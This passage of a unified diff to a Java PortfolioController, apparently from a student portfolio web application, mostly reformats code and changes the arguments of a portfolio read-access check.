-		String portfolioString = portfolioManager.getPortfolioByEntityId(entityId);
+		String portfolioString = portfolioManager
+				.getPortfolioByEntityId(entityId);
 		if (portfolioString == null)
 			return null;
 		DomainObject obj = new DomainObject(portfolioString);
@@ -938,7 +1036,7 @@ public class PortfolioController extends SCController {
 		p.setId(obj.getId());
 
 		// check if can access portfolio
-		if (!canRead(Long.valueOf(getBasicProfile(request).getSocialId()), p.getEntityId())) {
+		if (!canRead(user, p.getEntityId().toString())) {
 			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
 			return null;
 		}
@@ -959,7 +1057,7 @@ public class PortfolioController extends SCController {
 		}
 		container.setStudentInfo(si);
 		BasicProfile basicProfile = null;
-		
+
 		if (!p.getUserId().equals(currentUserId)) {
 			List<String> shown = p.getShowStudentInfo();
 			si.getStudentData().filterData(shown);
@@ -975,20 +1073,24 @@ public class PortfolioController extends SCController {
 		}
 
 		List<String> udList = p.getShowUserGeneratedData();
-//		// if no data is shared, neither the student exams are
-//		if (udList == null || udList.isEmpty())
-//			return null;
+		// // if no data is shared, neither the student exams are
+		// if (udList == null || udList.isEmpty())
+		// return null;
 
 		ArrayList<UserProducedData> updList = new ArrayList<UserProducedData>();
 		boolean showExams = false;
 		if (udList != null) {
-			List<String> all = portfolioManager.getAllUserProducedData(p.getUserId());
+			List<String> all = portfolioManager.getAllUserProducedData(p
+					.getUserId());
 			for (String s : all) {
 				obj = new DomainObject(s);
 				if (udList.contains(obj.getId())) {
-					UserProducedData upd = PortfolioUtils.convert(obj.getContent(), UserProducedData.class);
-					if (PortfolioManager.STUDENT_EDU_CATEGORY.equals(upd.getCategory())
-							&& PortfolioManager.STUDENT_EDU_TYPE.equals(upd.getType())) {
+					UserProducedData upd = PortfolioUtils.convert(
+							obj.getContent(), UserProducedData.class);
+					if (PortfolioManager.STUDENT_EDU_CATEGORY.equals(upd
+							.getCategory())
+							&& PortfolioManager.STUDENT_EDU_TYPE.equals(upd
+									.getType())) {
 						showExams = true;
 					}
 					upd.setId(obj.getId());
@@ -1016,7 +1118,8 @@ public class PortfolioController extends SCController {
 			String seString = portfolioManager.getStudentExams(p.getUserId());
 			if (seString != null && !seString.isEmpty()) {
 				obj = new DomainObject(seString);
-				StudentExams se = PortfolioUtils.convert(obj.getContent(), StudentExams.class);
+				StudentExams se = PortfolioUtils.convert(obj.getContent(),
+						StudentExams.class);
 				se.setId(obj.getId());
 				seList.add(se);
 			}
@@ -1025,5 +1128,4 @@ public class PortfolioController extends SCController {
 
 		return container;
 	}
-
 }
